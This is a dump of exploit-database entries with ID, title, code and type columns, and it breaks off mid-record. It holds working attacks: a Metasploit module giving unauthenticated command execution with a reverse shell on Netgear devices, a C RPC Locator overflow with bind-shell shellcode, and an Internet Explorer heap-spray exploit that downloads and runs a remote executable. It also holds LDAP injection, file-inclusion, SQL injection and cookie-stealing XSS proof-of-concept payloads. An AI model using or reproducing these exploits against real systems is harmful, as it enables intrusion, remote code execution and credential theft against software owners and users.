11364,"LDAP - Injection [+] Vurnerebility:	LDAP Injection  [+] Category	 :	Implemented Web exploit	 	 [+] Category	 :	Attack Technique [+] Author 	 :	mc2_s3lector  [+] dork   	 :	X/o\""	 [+] Contact	 : 	www.yogyacarderlink.web.id [+] date	 :	4-2-10 [+] biGthank to	 :	Allah SWT,jasakom,KeDai Computerworks,0n3-d4y n3ro,eplaciano, all*.indonesian like a coding,  --------------------------------------------------------------------------------------------------------------------------------------------------- Directory acces protokol/directory manipulation,protokol breaker->standar protocol,query custom statement,page request,componen execute command,data base server,web apps services modify,remove etc. ---------------------------------------------------------------------------------------------------------------------------------------------------  code: <html> <head> <body> <%@ Language=VBScript %> <% Dim userName Dim filter Dim ldapObj Const LDAP_SERVER = ""ldap.example"" userName = Request.QueryString(""user"")<-----------*1(LOOK THIS BUG LINE PARAMETER USER=EMPTY)  ( userName = """" ) then Response.Write(""<b>Invalid request. Please specify a valid user name</b><br>"") Response.End() end if  filter= ""(uid="" + CStr(userName) + //((*1)) userName used to initialize filter variable on this line direct query LDAP call to finf filter on ((*.3)) "")"" ' searching for the user entry 'Creat LDAP object and setting the base dn Set ldapObj = Server.CreateObject(""IPWorksASP.LDAP"") ldapObj.ServerName = LDAP_SERVER ldapObj.DN = ""ou=people,dc=spilab,dc=com"" 'Setting the search filter ldapObj.SearchFilter = ((*.3))filter<---call SearchFilter on this line ldapObj.Search 'Showing the user ennumeratin info While ldapObj.result = ((1*.4 to *.5)) Response.Write(""<p>"") Write(""<b><u>User information for : "" + ldapObj.AttrValue(0) + ""</u></b><br>"") For i = 0 To ldapObj.AttrCount -1 Response.Write(""<b>"" + ldapObj.AttrType(i) + ""</b> : "" + ldapObj.AttrValue(i) + ""<br>"" ) Response.Write(""</p>"") Wend ((*.5)) %> </head> </body> </html> --------------------------------------------------------------------------------------------------------------------------------------------------- control over LDAP to querry =server LDAP & get query result from ((*.4 to *.5))  POC:  http://server/ldapsearch.asp?user=* <----send the * character in the parameter user,result flter variable in code to be initialized with (uid=*). The resulting LDAP statement will make the server return -------------------------------------------------------------------------------------------------------------------------------------------------",local,local,1
45909,"Netgear Devices - (Unauthenticated) Remote Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::CmdStager    def initialize(info = {})     super(update_info(info,       'Name'        => 'Netgear Devices Unauthenticated Remote Command Execution',       'Description' => %q{         From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,         (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in         Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,         WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute         arbitrary commands.       },       'Author'      =>         [           'Daming Dominic Chen <ddchen[at]cs.cmu.edu>', # Vuln discovery           'Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # MSF module         ],       'License'     => MSF_LICENSE,       'References'  =>         [           ['CVE', '2016-1555'],           ['URL', 'https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic'],           ['PACKETSTORM', '135956'],           ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/112']         ],       'DisclosureDate' => 'Feb 25 2016', # According to http://seclists.org/fulldisclosure/2016/Feb/112       'Privileged'     => true,       'Platform'       => 'linux',       'Arch'           => ARCH_MIPSBE,       'Payload'        => {},       'DefaultOptions' => {         'CMDSTAGER::FLAVOR' => 'wget',         'PAYLOAD'           => 'linux/mipsbe/shell_reverse_tcp',         'WfsDelay'          => 10 },       'Targets'        => [['Automatic', { }]],       'CmdStagerFlavor'=> %w{ echo printf wget },       'DefaultTarget'  => 0       ))       register_options(       [         OptString.new('TARGETURI', [true, 'Path of the vulnerable URI.', '/boardDataWW.php']), # boardDataWW.php         OptString.new('MAC_ADDRESS', [true, 'MAC address to use (default: random)', Rex::Text.rand_text_hex(12)])       ])   end    # check for vulnerability existence   def check     fingerprint = Rex::Text.rand_text_alpha(12) # If vulnerability is present, we will get this back in the response     res = execute_command(""echo #{fingerprint}"") # the raw POST response      unless res       vprint_error 'Connection failed'       return CheckCode::Unknown     end      unless res.code == 200       return CheckCode::Safe     end      unless res.get_html_document.at('input').to_s.include? fingerprint       return CheckCode::Safe     end      CheckCode::Vulnerable   end    # execute a command, or simply send a POST request   def execute_command(cmd, opts = {})     vars_post = {       'macAddress' => ""#{datastore['MAC_ADDRESS']};#{cmd};"",       'reginfo' => '1',       'writeData' => 'Submit'     }      send_request_cgi({       'method'  => 'POST',       'headers' => { 'Connection' => 'Keep-Alive' },       'uri'     => normalize_uri(target_uri.path),       'vars_post' => vars_post     })   rescue ::Rex::ConnectionError     fail_with(Failure::Unreachable, ""#{peer} - Failed to connect to the target!"")   end    # the exploit method   def exploit     #run a check before attempting to exploit     unless [CheckCode::Vulnerable].include? check       fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'     end      execute_cmdstager(linemax: 2048) # maximum 130,000   end  end",remote,remote,1
25704,PHP Poll Creator 1.0.1 - 'Poll_Vote.php' Remote File Inclusion source: https://www.securityfocus.com/bid/13760/info  PHP Poll Creator is affected by a remote file-include vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.  UPDATE: Further information shows that this issue does not affect version 1.04.   http://www.example.com/poll_vote.php?relativer_pfad=http://www.example.com/,remote,webapps,1
17664,"NSHC Papyrus 2.0 - Heap Overflow #!/usr/bin/python #  # Title: NSHC Papyrus Heap Overflow Vulnerability  # Date: 13\08\2011  # Author: wh1ant # Software Link: http://file.atfile.com/ftp/data/03/PapyrusSetup.exe # Version: 2.0  # Tested On: windows XP SP3 South Korea / windows XP SP3 English VMware Workstation # CVE: N/A  # Notice: # Encrypt/Decrypt programs that are created by NSHC #   fd = open(""Attack.txt"", ""w"") data = 'A' for i in range(0, 1003):  fd.write(data) fd.write(""BBBB""); fd.write(""CCCC""); for i in range(0, 2000):  fd.write(data); fd.close()",local,dos,1
35520,"Claroline 1.10 - Multiple HTML Injection Vulnerabilities source: https://www.securityfocus.com/bid/47073/info  Claroline is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.  Claroline 1.10 is vulnerable; other versions may also be affected.   ""><script>alert(0)</script>",remote,webapps,1
16222,course registration management system 2.1 - Multiple Vulnerabilities Source: http://packetstormsecurity.org/files/view/98650/CourseMS2.1-LFI.txt  ------------------------------------------------------------------------ Software................Course MS 2.1 Vulnerability...........Local File Inclusion Download................http://sourceforge.net/projects/coursems Release Date............2/14/2011 Tested On...............Windows Vista + XAMPP ------------------------------------------------------------------------ Author..................AutoSec Tools Site....................http://www.autosectools.com/ ------------------------------------------------------------------------  --Description--   A local file inclusion vulnerability in Course MS 2.1 can be exploited to include arbitrary files.   --PoC--  http://localhost/coursems2_2/download_file.php?path=../../../../../../../../windows/win.ini%00   An SQL injection vulnerability in Course MS 2.1 can be exploited to bypass authentication.   --PoC--  Enter the following in the username field of the login screen:   'or 1=1;#  A reflected cross-site scripting vulnerability in Course MS 2.1 can be exploited to execute arbitrary JavaScript.   --PoC-- http://localhost/coursems2_2/gmap.php?lat=%3Cscript%3Ealert(0)%3C/script%3E&lon=%3Cscript%3Ealert(0)%3C/script%3E&add1=%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&width=%3Cscript%3Ealert(0)%3C/script%3E&height=%3Cscript%3Ealert(0)%3C/script%3E   http://localhost/coursems2_2/resolve.php?add1=%3Cscript%3Ealert(0)%3C/script%3E,local,webapps,0
34916,IBM Tivoli Access Manager for E-Business - '/ibm/wpm/user?method' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info           IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.           An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.           IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable  http://www.example.com/ibm/wpm/user?method=props%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,remote,webapps,1
5,"Microsoft Windows 2000/NT 4 - RPC Locator Service Remote Overflow /**************************************************************************** rpcexp.c RPC LOCATOR Exploit Autor: Marcin Wolak mail: mwolak11@wp.pl Last update: 30 march 2003 ****************************************************************************/  /***************************************************************************** About Compilation: What You need to compile rpcexp.c ? 1. MS Platform SDK (August SDK is sufficient). 2. Compilator (f.e. MS Visual C++ 6.0). rpcns4.lib is needed for linking. *****************************************************************************/  /***************************************************************************** Usage (You want to exploit remote Windows 2000 system (w2khost) with running RPC Locator Service): 1. Set registry values in Your workstation as below: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\NetworkAddress = w2khost HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\ServerNetworkAddress = w2khost 2. Establish null session: net use \\w2khost\ipc$ """"/u: """" 3. Run Exploit: rpcexp.exe /os w2ksp3  If everything it's ok, rpcexp hangs in console window. You can go to second cmd console, run telnet (on port 5151) and get cmd on w2khost - just run on second console:  telnet w2khost 5151  WARNNING ! With this shellcode You can get remote cmd only once. Second attempt will be rejected.  WARNNING !! Currently only Windows 2000 Sp3 and Windows NT 4 Sp6a are exploitable with rpcexp.  *****************************************************************************/  #define UNICODE #define RPC_UNICODE_SUPPORTED  #define NT4SP6ABRD 0x42 #define W2KSP3BRD 0x142  #define NT4SP6AJMP 0x0147FBC4 #define W2KSP3JMP 0x0090F8F0  #define NT4SP6ALLA 0x77F137BD #define NT4SP6AGPA 0x77F13FB3  #include <stdio.h> #include <rpc.h> #include <rpcnsi.h>   #define PURPOSE \ ""RPC Locator exploit utility \n\ Autor: Marcin Wolak - march 2003 \n\ mail: mwolak@gazeta.pl \n\n\ Tested on:\n\n\ Windows 2000 SP3 \n\ Windows NT 4.0 SP6a \n\n\ Only for educational purposes !!!.\n\n\ Usage:\n\ rpcexp.exe /v  - to view rpcexp info.\n\ rpcexp.exe /os w2ksp3 - to exploit Windows 2000 Sp3.\n\ rpcexp.exe /os ntsp6a - to exploit Windows NT 4 Sp6a.\n""   char shellcode [] = ""\xEB\x13\x5F\xB9\xCF\x02\xCF\x02\xC1\xE9\x10\x57\x80\x37\x99\x47\xE2\xFA\x5F\xEB"" ""\x05\xE8\xE8\xFF\xFF\xFF\x14\x2E\x42\x98\x99\x99\x14\x06\x59\x9B\x99\x99\xCF\x66"" ""\x8A\xCE\x14\x06\x5D\x9B\x99\x99\x14\x26\x54\x9B\x99\x99\x10\x5B\x65\xA8\x50\x28"" ""\x94\xD0\xA9\x59\x35\x1D\x59\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2"" ""\x7B\x75\xC2\xCA\x14\x02\x59\x9B\x99\x99\xA9\x59\x35\x1D\x59\xEC\x60\xCF\x66\x8A"" ""\x10\x5B\xC2\xCA\x14\x02\x5D\x9B\x99\x99\x65\xA8\x50\x28\x9E\xA9\x59\x35\x1D\x59"" ""\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2\x7B\x75\xA8\x59\x2D\x9D\xC9"" ""\x58\x71\x9D\xC9\x66\xCE\x55\x10\x5B\xC2\xCA\x14\x02\x25\x99\x99\x99\xA8\x50\x18"" ""\x58\xC4\x9B\x99\x99\xC9\x13\x8A\x11\x89\xDA\xD9\x7B\x61\xC1\x14\x02\x15\x99\x99"" ""\x99\xCA\xF1\x99\x99\x99\x99\xC9\xC9\xF1\x99\x99\x99\x99\xF1\x99\x99\x99\x99\x66"" ""\xCE\x21\xC9\xF1\x99\x89\x99\x99\x66\xCE\x41\xC1\x72\x6D\x70\x9E\x9B\x99\x99\xC6"" ""\xCE\x18\x5E\xD5\x99\x99\x99\x10\x67\x18\x5F\x16\x66\x66\x66\xC2\x18\x5A\x39\x99"" ""\x99\x99\xCA\xF1\x9B\x9B\x99\x99\x66\xCE\x7D\xA8\x59\xC9\xD9\xC9\xD9\xC9\x66\xCE"" ""\x71\x0A\xF1\x89\x99\x99\x99\xCF\xCA\x66\xCE\x75\xF1\x9B\x99\x99\x99\xCA\x66\xCE"" ""\x69\xA8\x59\xCE\xC9\x29\x95\x32\xC1\x32\xD9\x32\xC6\xD1\xC9\xCE\xCF\x34\xCF\x66"" ""\xCE\x25\xD1\xC9\xCE\x34\xCF\x34\xCF\x66\xCE\x25\xD1\x29\xDD\x10\x9E\xCE\x66\xCE"" ""\x59\xA8\x59\x12\xDF\x6D\x10\xDE\xA5\x10\xDE\xD9\x12\x9F\x10\xDE\xA1\xA8\x59\xFF"" ""\x21\x98\x98\x10\xDE\xB5\xCE\xCE\xA8\x59\xC9\xC9\xC9\xD9\xC9\xD1\xC9\xC9\x34\xCF"" ""\xA8\x59\xC9\x66\xCE\x5D\x66\xEF\x69\x66\xCE\x79\x66\xEF\x65\x66\xCE\x79\xD1\xC9"" ""\xC9\xCA\x66\xCE\x6D\x10\x5A\xA8\x59\x2D\x9D\xC9\x58\x71\x9D\xC9\x66\xCE\x55\x10"" ""\x5F\xA8\x59\x10\x58\x2C\x9D\xC9\xC9\xCE\xC8\xCF\x66\xEE\x0A\x66\xCE\x51\x18\xA6"" ""\x98\x99\x99\x99\xE5\xBC\xA8\x59\xC9\xCE\x66\xAE\xCF\x66\xEE\x0A\x66\xCE\x4D\x90"" ""\x59\xED\x8D\xA8\x59\xC9\x66\xAE\xCF\xCA\x66\xCE\x61\xF1\xC9\x99\x99\x99\x66\xCE"" ""\x41\x72\x5B\xA8\x59\xC9\x2D\x9D\xC9\xCF\xCA\x66\xCE\x65\xCE\xA8\x50\xC8\xC9\xCF"" ""\x66\xEE\x0E\x66\xCE\x49\xF1\xC9\x99\x99\x99\x66\xCE\x41\x72\x38\xC9\x66\xCE\x45"" ""\x09\xD2\xDC\xCB\xD7\xDC\xD5\xAA\xAB\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD"" ""\x99\xDA\xEB\xFC\xF8\xED\xFC\xCD\xF1\xEB\xFC\xF8\xFD\x99\xDA\xEB\xFC\xF8\xED\xFC"" ""\xC9\xF0\xE9\xFC\x99\xDE\xFC\xED\xCA\xED\xF8\xEB\xED\xEC\xE9\xD0\xF7\xFF\xF6\xD8"" ""\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xC9\xFC\xFC\xF2"" ""\xD7\xF8\xF4\xFC\xFD\xC9\xF0\xE9\xFC\x99\xDE\xF5\xF6\xFB\xF8\xF5\xD8\xF5\xF5\xF6"" ""\xFA\x99\xCE\xEB\xF0\xED\xFC\xDF\xF0\xF5\xFC\x99\xCB\xFC\xF8\xFD\xDF\xF0\xF5\xFC"" ""\x99\xCA\xF5\xFC\xFC\xE9\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xDA"" ""\xF5\xF6\xEA\xFC\xD1\xF8\xF7\xFD\xF5\xFC\x99\xCE\xCA\xD6\xDA\xD2\xAA\xAB\x99\xCE"" ""\xCA\xD8\xCA\xED\xF8\xEB\xED\xEC\xE9\x99\xEA\xF6\xFA\xF2\xFC\xED\x99\xFB\xF0\xF7"" ""\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xEA\xFC\xF7\xFD"" ""\x99\xEB\xFC\xFA\xEF\x99\x9B\x99\x8D\x86\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"" ""\x99\x99\xFA\xF4\xFD\xB7\xFC\xE1\xFC\x99\xFD\x06\x71\xEE\x81\x02\x71\xEE\x71\x6D"" ""\x64\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"";  void Usage(char * pszProgramName) {     fprintf(stderr, ""%s"", PURPOSE);     exit(1); }  void _CRTAPI1 main(int argc, char **argv) { 	unsigned short mytab[2000];				// Exploit Buffer     unsigned char * TmpEntryName  = NULL;		// Temporary Entry. 	unsigned long * EntryName  = NULL; 	unsigned long * TmpPtr  = NULL;     unsigned short * pszStrBinding = NULL;     RPC_NS_HANDLE hnsHandle;     unsigned long NsSntxType = RPC_C_NS_SYNTAX_DEFAULT;     RPC_STATUS status;     short fSuccess = 0;     short fContinue = 1;     unsigned long i,k;  	unsigned long * PtrLLA = (unsigned long*) &shellcode[730]; 	unsigned long * PtrGPA = (unsigned long*) &shellcode[734]; 	unsigned long JMP = W2KSP3JMP; 	unsigned long BORDER = W2KSP3BRD;  	switch(argc){ 		case 2: 			if((strlen(argv[1]) == 2) && (!strcmp(argv[1],""/v""))) 				Usage(argv[0]); 			else 				printf(""Bad arguments !!!\n""); 			exit(2); 		case 3: 			if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) && 			   (!strcmp(argv[1],""/os"")) && (!strcmp(argv[2],""w2ksp3""))) 			   break; 			if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) && 			   (!strcmp(argv[1],""/os"")) && (!strcmp(argv[2],""ntsp6a""))) 			{ 				(*PtrLLA) = NT4SP6ALLA ^ 0x99999999; 				(*PtrGPA) = NT4SP6AGPA ^ 0x99999999; 				JMP = NT4SP6AJMP; 				BORDER = NT4SP6ABRD; 			    break; 			} 		default: 			Usage(argv[0]);  	}  	EntryName = (unsigned long *) mytab; 	TmpEntryName = (unsigned char *) mytab; 	TmpEntryName[0] = '/'; 	TmpEntryName[1] = 0; 	TmpEntryName[2] = '.'; 	TmpEntryName[3] = 0; 	TmpEntryName[4] = ':'; 	TmpEntryName[5] = 0; 	TmpEntryName[6] = '/'; 	TmpEntryName[7] = 0; 	for (i=2;i<768;i++) 	{ 		if(i <= BORDER) 			EntryName[i] = JMP; 		if(i == BORDER) 		{ 			TmpPtr = (unsigned long*) shellcode; 			for(k = 0;k < 190;k++) 				EntryName[i+k] = TmpPtr[k]; 			i += 189; 		} 		if(i > BORDER) 			EntryName[i] = JMP; 	} 	EntryName[768] = 0;  	  RpcTryExcept { 		  status = RpcNsBindingLookupBegin(NsSntxType,                                          (unsigned short *) EntryName,                                          0,                                          NULL, 							0, 							&hnsHandle); 		  printf(""RpcNsBindingLookupBegin returned 0x%x\n"", status); 	  } 	  RpcExcept(1){ 		  printf(""RPC Runtime raised exception 0x%x\n"", RpcExceptionCode()); 	  } 	  RpcEndExcept } /*End of Main*/  // milw0rm.com [2003-04-03]",remote,remote,1
39493,"libxml2 - xmlParserPrintFileContextInternal Heap Buffer Overread Source: https://code.google.com/p/google-security-research/issues/detail?id=639  The following crash due to a heap-based out-of-bounds memory read can be observed in an ASAN build of latest stable libxml2 (2.9.3, released 4 days ago), by feeding a malformed file to xmllint (""$ ./xmllint /path/to/file""):  --- cut --- ==4210==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6290000051ff at pc 0x000000533c8f bp 0x7ffdb38c4830 sp 0x7ffdb38c4828 READ of size 1 at 0x6290000051ff thread T0     #0 0x533c8e in xmlParserPrintFileContextInternal libxml2-2.9.3/error.c:192:6     #1 0x54088a in xmlReportError libxml2-2.9.3/error.c:406:9     #2 0x53884f in __xmlRaiseError libxml2-2.9.3/error.c:633:2     #3 0x56f0ec in xmlFatalErr libxml2-2.9.3/parser.c:540:5     #4 0x569c98 in xmlGROW libxml2-2.9.3/parser.c:2077:9     #5 0x62bcb3 in xmlParseEndTag2 libxml2-2.9.3/parser.c:9846:5     #6 0x61d620 in xmlParseElement libxml2-2.9.3/parser.c:10238:2     #7 0x63be9b in xmlParseDocument libxml2-2.9.3/parser.c:10912:2     #8 0x672b74 in xmlDoRead libxml2-2.9.3/parser.c:15390:5     #9 0x673041 in xmlReadFile libxml2-2.9.3/parser.c:15452:13     #10 0x4f5b60 in parseAndPrintFile libxml2-2.9.3/xmllint.c:2401:9     #11 0x4ebe8f in main libxml2-2.9.3/xmllint.c:3759:7  0x6290000051ff is located 1 bytes to the left of 16384-byte region [0x629000005200,0x629000009200) allocated by thread T0 here:     #0 0x4b8b68 in malloc llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:40     #1 0x7f4df5219729  (/lib/x86_64-linux-gnu/libz.so.1+0xf729)  SUMMARY: AddressSanitizer: heap-buffer-overflow libxml2-2.9.3/error.c:192:6 in xmlParserPrintFileContextInternal Shadow bytes around the buggy address:   0x0c527fff89e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c527fff89f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c527fff8a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c527fff8a10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c527fff8a20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c527fff8a30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]   0x0c527fff8a40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c527fff8a50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c527fff8a60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c527fff8a70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c527fff8a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==4210==ABORTING --- cut ---  The crash was reported at https://bugzilla.gnome.org/show_bug.cgi?id=758588. Attached is an XML file which triggers the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39493.zip",remote,dos,0
28942,"FreeWebShop 2.1/2.2 - 'index.php?page' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/20969/info  FreeWebShop is prone to multiple input-validation vulnerabilities, including a cross-site scripting issue and a local file-include issue.  An attacker can exploit these issues to view files, execute local scripts, steal cookie-based authentication credentials, and launch other attacks.  FreeWebShop 2.2 and prior versions are vulnerable to these issues.  http://www.example.com/index.php?page=../../../../../../../../../../etc/passwd%00",local,webapps,0
26120,"FunkBoard 0.66 - 'reply.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/14507/info     FunkBoard is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.     An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/funkboard/reply.php?forumid=1&threadid=1&fbusername=""><script>alert(document.cookie)</script> http://www.example.com/funkboard/reply.php?forumid=1&threadid=1&fbpassword=""><script>alert(document.cookie)</script>",remote,webapps,1
2358,"Microsoft Internet Explorer - COM Object Remote Heap Overflow /* *----------------------------------------------------------------------- * * daxctle2.c - Internet Explorer COM Object Heap Overflow Download Exec Exploit * !!! 0day !!!  Public Version !!! * * Copyright (C) 2006 XSec All Rights Reserved. * * Author   : nop *          : nop#xsec.org *          : http://www.xsec.org *          : * Tested   : Windows 2000 Server SP4 CN *          :     + Internet Explorer 6.0 SP1 *          : Windows XP SP2 CN *          :     + Internet Explorer 6.0 SP1 (You need some goodluck! :-) *          : * Complie  : cl daxctle2.c *          : * Usage       :d:\>daxctle2 *          : *          :Usage: daxctle <URL> [htmlfile] *          : *          :d:\>daxctle2 http://xsec.org/xxx.exe xxx.htm *          : *           *------------------------------------------------------------------------ */  #include <stdio.h> #include <stdlib.h>  FILE *fp = NULL; char *file = ""xsec.htm""; char *url = NULL;  // Download Exec Shellcode by nop unsigned char sc[] =      ""\xe9\xa3\x00\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b"" ""\x70\x1c\xad\x8b\x68\x08\x8b\xf7\x6a\x04\x59\xe8\x43\x00\x00\x00"" ""\xe2\xf9\x68\x6f\x6e\x00\x00\x68\x75\x72\x6c\x6d\x54\xff\x16\x95"" ""\xe8\x2e\x00\x00\x00\x83\xec\x20\x8b\xdc\x6a\x20\x53\xff\x56\x04"" ""\xc7\x04\x03\x5c\x61\x2e\x65\xc7\x44\x03\x04\x78\x65\x00\x00\x33"" ""\xc0\x50\x50\x53\x57\x50\xff\x56\x10\x8b\xdc\x50\x53\xff\x56\x08"" ""\xff\x56\x0c\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56\x8b"" ""\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33\xdb\x0f\xbe\x10"" ""\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b\x1f\x75\xe7"" ""\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd\x8b"" ""\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x58\xff\xff\xff\x8e\x4e\x0e"" ""\xec\xc1\x79\xe5\xb8\x98\xfe\x8a\x0e\xef\xce\xe0\x60\x36\x1a\x2f"" ""\x70"";      char * header = ""<html>\n"" ""<head>\n"" ""<title>XSec.org</title>\n"" ""</head>\n"" ""<body>\n"" ""<script>\n"" ""shellcode = unescape(\""%u4343\""+\""%u4343\""+\""%u4343\"" + \n"";  // Change this script by yourself. char * footer = ""bigbk = unescape(\""%u0D0D%u0D0D\"");\n"" ""headersize = 20;\n"" ""slackspace = headersize + shellcode.length\n"" ""while (bigbk.length < slackspace) bigbk += bigbk;\n"" ""fillbk = bigbk.substring(0, slackspace);\n"" ""bk = bigbk.substring(0, bigbk.length-slackspace);\n"" // bk = nop+nop;-) ""while(bk.length+slackspace < 0x40000) bk = bk + bk + fillbk;\n""   ""memory = new Array();\n"" ""for (i=0;i<800;i++) memory[i] = bk + shellcode;\n"" ""var target = new ActiveXObject(\""DirectAnimation.PathControl\"");\n"" ""target.KeyFrame(0x7fffffff, new Array(1), new Array(65535));\n"" ""</script>\n"" ""</body>\n"" ""</html>\n"";  // print unicode shellcode void PrintUc(char *lpBuff, int buffsize) {    int i,j;    char *p;    char msg[4];     for(i=0;i<buffsize;i+=2)        {        if((i%16)==0)        {            if(i!=0)            {                printf(""\""\n\"""");                fprintf(fp, ""%s"", ""\"" +\n\"""");            }            else            {                printf(""\"""");                fprintf(fp, ""%s"", ""\"""");            }        }                    printf(""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]);                fprintf(fp, ""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]);      }               printf(""\"";\n"");        fprintf(fp, ""%s"", ""\"");\n"");                      fflush(fp); }  void main(int argc, char **argv) {    unsigned char buf[1024] = {0};     int sc_len = 0;           if (argc < 2)    {          printf(""Internet Explorer COM Object Remote Heap Overflow Download Exec Exploit\n"");          printf(""Code by nop nop#xsec.org, Welcome to http://www.xsec.org\n"");          //printf(""!!! 0Day !!! Please Keep Private!!!\n"");        printf(""\r\nUsage: %s <URL> [htmlfile]\r\n\n"", argv[0]);        exit(1);    }        url = argv[1];        //if( (!strstr(url, ""http://"") &&  !strstr(url, ""ftp://"")) || strlen(url) < 10 || strlen(url) > 60)         if( (!strstr(url, ""http://"") &&  !strstr(url, ""ftp://"")) || strlen(url) < 10)         {             //printf(""[-] Invalid url. Must start with 'http://','ftp://' and < 60 bytes.\n"");             printf(""[-] Invalid url. Must start with 'http://','ftp://'\n"");             return;                         }        printf(""[+] download url:%s\n"", url);              if(argc >=3) file = argv[2];       printf(""[+] exploit file:%s\n"", file);            fp = fopen(file, ""w"");    if(!fp)    {        printf(""[-] Open file error!\n"");           return;    }            // print html header    fprintf(fp, ""%s"", header);    fflush(fp);        // print shellcode    memset(buf, 0, sizeof(buf));    sc_len = sizeof(sc)-1;    memcpy(buf, sc, sc_len);    memcpy(buf+sc_len, url, strlen(url));        sc_len += strlen(url)+1;    PrintUc(buf, sc_len);      // print html footer    fprintf(fp, ""%s"", footer);    fflush(fp);          printf(""[+] exploit write to %s success!\n"", file); }  // milw0rm.com [2006-09-13]",remote,remote,1
21220,"VICIDIAL Call Center Suite 2.2.1-237 - Multiple Vulnerabilities   ####################################################################################   #                                                                                  #   #     ...:::::VICIDIAL call center suite Blind SQL Injection Vulnerability::::.... #            ####################################################################################                                     Sepahan TelCom IT Group (septelcom) 								       ------------------------------------------------------- # Date: 2012-09-07 # Exploit Author: Sepahan TelCom IT Group (septelcom) # Vendor Homepage: http://www.vicidial.org # Software Link: https://sourceforge.net/project/showfiles.php?group_id=95133&package_id=101320 #Affected version: <=2.2.1-237  									   VICIDIAL is a set of programs that are designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound call center suite. --------------------------------------------------------  									   I'M hadihadi From Virangar Security Team  special tnx to:MR.nosrati,black.shadowes,MR.hesy & all virangar members & all hackerz  greetz to My best friends & partners in septelcom group : Reza Kazemian,Hossein Ghasemi  